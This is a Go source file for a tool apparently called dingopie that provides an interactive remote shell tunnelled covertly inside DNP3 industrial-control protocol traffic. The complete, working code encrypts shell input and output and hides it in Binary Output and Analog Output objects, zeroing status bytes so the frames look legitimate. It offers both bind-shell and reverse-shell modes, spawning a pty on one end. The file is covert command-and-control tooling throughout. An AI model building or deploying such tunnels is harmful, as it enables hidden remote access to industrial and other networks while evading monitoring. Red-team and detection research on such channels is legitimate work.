// Package shell provides an interactive remote shell over a DNP3 channel. A server or client hosts a pty, and the
// other side connects to it. The data stream in each direction is chunked into a byte slice small enough to fit into
// a single DNP3 frame, and then padded and encrypted before being sent as DNP3 Application Objects. The sender also
// prepends the size of legitimate data before padding, so the receiver knows how much data to keep after decrypting.
//
// Data Scheme:
//   - Data from the Client (DNP3 Master) uses Direct Operate No Ack requests. This allows large chunks of data to be
//     sent, and avoids traditional 'ACKs' that come with Select/Operate or Direct Operate requests. Each frame will
//     have a single Group 41 Variation 2 (Binary Output Status) object containing the size of the data being sent
//     (5 byte header, 2 bytes of length + 1 byte event status). The payload is sent in Group 41 Variation 1 (Binary
//     Output Command) objects (5 byte header, N*(4 bytes of data + 1 byte event status)). In both, event status
//     bytes are set to 0x00 to satisfy DNP3 object structure requirements (packing data in here would show strange
//     statuses and potentially use a reserved bit).
//   - Data from the Server (DNP3 Outstation) uses Unsolicited Response messages. This prevents the need for waiting
//     for a read request from the client before sending data. Each frame will have a single Group 30 Variation 4
//     (Analog Output Status) object containing the size of the data being sent (5 byte header + 2 bytes of length).
//     The payload is sent in Group 30 Variation 3 (Analog Output Command) objects (5 byte header, N*4 bytes of data).
package shell

import (
	"bytes"
	"crypto/cipher"
	"dingopie/internal"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"slices"
	"strconv"
	"strings"

	"github.com/creack/pty"
	"github.com/nblair2/go-dnp3/dnp3"
	"golang.org/x/term"
)

// ==================================================================
// COMMON
// ==================================================================

var (
	// maxDataLen constricts data in each packet to one DNP3 frame so that we don't split data across frames.
	serverMaxDataLen = 232 // 256 + 5 'free' DL bytes - 'overhead' (DL + T + A + our length object + data header)
	clientMaxDataLen = 184 // 80% of above, because each data object needs an extra event status byte
	// Signal bytes for DNP3 messages
	// Primary (client -> server).
	reqSendSize = internal.DNP3G41V2Q0
	reqSendData = internal.DNP3G41V1Q0
	// Secondary (server -> client).
	respSendSize = internal.DNP3G30V4Q0
	respSendData = internal.DNP3G30V3Q0
	// 'salt' so encryption streams aren't symmetrical.
	salt = "Three may keep a secret, if two of them are dead."
)

// shell initiates an interactive shell session over the provided stream.
func shell(command string, stream dnp3Stream, maxDataLen int) error {
	if runtime.GOOS == "windows" {
		return errors.New("shell is not supported on Windows")
	}

	var c *exec.Cmd

	if strings.HasSuffix(command, "bash") {
		rcContent := `PS1="dingopie> "`
		//nolint:gosec //G204 user provided command which they must have permissions to run
		c = exec.Command(
			"bash",
			"-c",
			fmt.Sprintf("exec %s --rcfile <(echo '%s') -i", command, rcContent),
		)
	} else {
		c = exec.Command(command)
	}

	ptmx, err := pty.Start(c)
	if err != nil {
		return fmt.Errorf("error starting pty: %w", err)
	}
	defer ptmx.Close()

	buf := make([]byte, maxDataLen)

	go func() { _, _ = io.Copy(ptmx, stream) }()

	_, _ = io.CopyBuffer(stream, ptmx, buf)

	fmt.Printf(">> Shell session ended\n")

	return nil
}

// connect attaches to a shell using the provided stream.
func connect(stream dnp3Stream, maxDataLen int) error {
	if term.IsTerminal(int(os.Stdin.Fd())) {
		oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
		if err != nil {
			return fmt.Errorf("error setting terminal to raw mode: %w", err)
		}
		//nolint:errcheck // best effort
		defer term.Restore(int(os.Stdin.Fd()), oldState)
	}

	done := make(chan error, 1)

	go func() {
		_, err := io.Copy(os.Stdout, stream)
		done <- err
	}()

	go func() {
		buf := make([]byte, maxDataLen)
		_, _ = io.CopyBuffer(stream, os.Stdin, buf)
	}()

	return <-done
}

// dnp3Stream implements io.ReadWriteCloser to manage copying data over a net.Conn using our DNP3 scheme.
type dnp3Stream struct {
	primary    bool
	frame      dnp3.Frame
	conn       net.Conn
	txCipher   cipher.Stream
	rxCipher   cipher.Stream
	txSendSize []byte
	txSendData []byte
	rxSendSize []byte
	rxSendData []byte
	maxDataLen int
}

func newClientStream(key string, conn net.Conn) dnp3Stream {
	frame := internal.NewDNP3RequestFrame()
	// Use Direct Operate No Ack so we can get mono-directional comms and don't have to deal with ACKs
	frame.Application.SetFunctionCode(byte(dnp3.DirOperateNoAck))
	stream := dnp3Stream{
		primary:    true,
		frame:      frame,
		conn:       conn,
		txCipher:   internal.NewCipherStream(key + salt),
		rxCipher:   internal.NewCipherStream(key),
		txSendSize: reqSendSize,
		txSendData: reqSendData,
		rxSendSize: respSendSize,
		rxSendData: respSendData,
		maxDataLen: clientMaxDataLen,
	}

	return stream
}

func newServerStream(key string, conn net.Conn) dnp3Stream {
	frame := internal.NewDNP3ResponseFrame()
	// Use Unsolicited Response so we can get mono-directional comms and don't have to deal with requests
	frame.Application.SetFunctionCode(byte(dnp3.UnsolicitedResponse))
	stream := dnp3Stream{
		primary:    false,
		frame:      frame,
		conn:       conn,
		txCipher:   internal.NewCipherStream(key),
		rxCipher:   internal.NewCipherStream(key + salt),
		txSendSize: respSendSize,
		txSendData: respSendData,
		rxSendSize: reqSendSize,
		rxSendData: reqSendData,
		maxDataLen: serverMaxDataLen,
	}

	return stream
}

func (ds dnp3Stream) Read(data []byte) (int, error) {
	buf := make([]byte, 4096)

	n, err := ds.conn.Read(buf)
	if errors.Is(err, io.EOF) {
		return 0, io.EOF
	} else if err != nil {
		return 0, fmt.Errorf("error reading data: %w", err)
	}

	frames, err := internal.SplitDNP3Frames(buf[:n])
	if err != nil {
		return 0, fmt.Errorf("error splitting DNP3 frames: %w", err)
	}

	var size int

	for _, frame := range frames {
		fd, err := ds.processFrame(frame)
		if err != nil {
			return 0, fmt.Errorf("error processing frame: %w", err)
		}

		fs := len(fd)
		if size+fs > len(data) {
			return size, fmt.Errorf("buffer too small: have %d, need %d", len(data), size+fs)
		}

		copy(data[size:size+fs], fd)
		size += fs
	}

	return size, nil
}

func (ds dnp3Stream) Write(data []byte) (int, error) {
	totalWritten := 0

	for len(data) > 0 {
		// Calculate how much of remaining data to send
		chunkSize := min(len(data), ds.maxDataLen)
		chunk := data[:chunkSize]

		sizeBytes := make([]byte, 2)
		//nolint:gosec // G115 clamped above to maxDataLen
		binary.BigEndian.PutUint16(sizeBytes, uint16(chunkSize))

		// Pad to 4 byte boundary, encrypt
		padded := internal.PadDataToChunkSize(chunk, 4)
		if len(padded) > ds.maxDataLen {
			return totalWritten, fmt.Errorf(
				"after padding data length %d exceeds max data length %d",
				len(padded),
				ds.maxDataLen,
			)
		}

		var err error

		encData := make([]byte, len(padded))
		ds.txCipher.XORKeyStream(encData, padded)
		// If this is a client to server, the points need an extra event status byte
		if ds.primary {
			sizeBytes, err = internal.InsertPeriodicBytes(sizeBytes, []byte{0x00}, 2, 2)
			if err != nil {
				return totalWritten, fmt.Errorf(
					"error inserting periodic bytes on sizeBytes: %w",
					err,
				)
			}

			encData, err = internal.InsertPeriodicBytes(encData, []byte{0x00}, 4, 4)
			if err != nil {
				return totalWritten, fmt.Errorf("error inserting periodic bytes on chunk: %w", err)
			}
		}

		// encode to DNP3, send
		msg, err := internal.MakeDNP3Bytes(
			&ds.frame,
			ds.txSendSize,
			sizeBytes,
			ds.txSendData,
			encData,
		)
		if err != nil {
			return totalWritten, fmt.Errorf("error making DNP3 bytes: %w", err)
		}

		_, err = ds.conn.Write(msg)
		if err != nil {
			return totalWritten, fmt.Errorf("error writing data: %w", err)
		}

		// Update remaining
		totalWritten += chunkSize
		data = data[chunkSize:]
	}

	return totalWritten, nil
}

func (ds dnp3Stream) Close() error {
	err := ds.conn.Close()

	return fmt.Errorf("error closing connection: %w", err)
}

func (ds dnp3Stream) processFrame(frame []byte) ([]byte, error) {
	// Get data
	rxHeader, rxData, err := internal.GetObjectDataFromDNP3Bytes(frame)
	if err != nil {
		return nil, fmt.Errorf("error parsing DNP3 response: %w", err)
	} else if !slices.Equal(ds.rxSendSize, rxHeader[0]) && !slices.Equal(ds.rxSendData, rxHeader[1]) {
		return nil, errors.New("invalid DNP3 response received")
	}

	sizeBytes := rxData[0]
	cleanData := bytes.Join(rxData[1:], nil)

	// if receiving from client, remove object event status bytes
	if !ds.primary {
		sizeBytes, err = internal.RemovePeriodicBytes(sizeBytes, 1, 2, 2)
		if err != nil {
			return nil, fmt.Errorf("error removing periodic bytes from sizeBytes: %w", err)
		}

		cleanData, err = internal.RemovePeriodicBytes(cleanData, 1, 4, 4)
		if err != nil {
			return nil, fmt.Errorf("error removing periodic bytes from data: %w", err)
		}
	}

	// Get size
	size := int(binary.BigEndian.Uint16(sizeBytes))
	if size > serverMaxDataLen {
		return nil, fmt.Errorf("data length %d exceeds max of %d", size, serverMaxDataLen)
	}

	// Decrypt
	decData := make([]byte, len(cleanData))
	ds.rxCipher.XORKeyStream(decData, cleanData)

	return decData[:size], nil
}

// ==================================================================
// CLIENT
// ==================================================================

// ClientConnect - dingopie client direct connect.
func ClientConnect(ip string, port int, key string) error {
	conn, err := net.Dial("tcp", net.JoinHostPort(ip, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("error connecting: %w", err)
	}
	defer conn.Close()

	fmt.Printf(">> Connected to %s:%d\n", ip, port)
	fmt.Print(internal.Banner)

	stream := newClientStream(key, conn)

	return connect(stream, clientMaxDataLen)
}

// ClientShell - dingopie client direct shell.
func ClientShell(command, key, ip string, port int) error {
	conn, err := net.Dial("tcp", net.JoinHostPort(ip, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("error connecting: %w", err)
	}
	defer conn.Close()

	fmt.Printf(">> Connected to %s:%d\n", ip, port)

	stream := newClientStream(key, conn)

	return shell(command, stream, clientMaxDataLen)
}

// ==================================================================
// SERVER
// ==================================================================

// ServerConnect - dingopie server direct connect.
func ServerConnect(key, ip string, port int) error {
	ln, err := net.Listen("tcp", net.JoinHostPort(ip, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("error starting TCP listener: %w", err)
	}
	defer ln.Close()

	fmt.Printf(">> Listening on %s:%d\n", ip, port)

	conn, err := ln.Accept()
	if err != nil {
		return fmt.Errorf("error accepting connection: %w", err)
	}
	defer conn.Close()

	fmt.Printf("\tConnection %s\n", conn.RemoteAddr().String())
	fmt.Print(internal.Banner)

	stream := newServerStream(key, conn)

	return connect(stream, serverMaxDataLen)
}

// ServerShell - dingopie server direct shell.
func ServerShell(command, key, ip string, port int) error {
	ln, err := net.Listen("tcp", net.JoinHostPort(ip, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("error starting TCP listener: %w", err)
	}
	defer ln.Close()

	fmt.Printf(">> Listening on %s:%d\n", ip, port)

	conn, err := ln.Accept()
	if err != nil {
		return fmt.Errorf("error accepting connection: %w", err)
	}
	defer conn.Close()

	fmt.Printf("\tConnection %s\n", conn.RemoteAddr().String())
	stream := newServerStream(key, conn)

	return shell(command, stream, serverMaxDataLen)
}
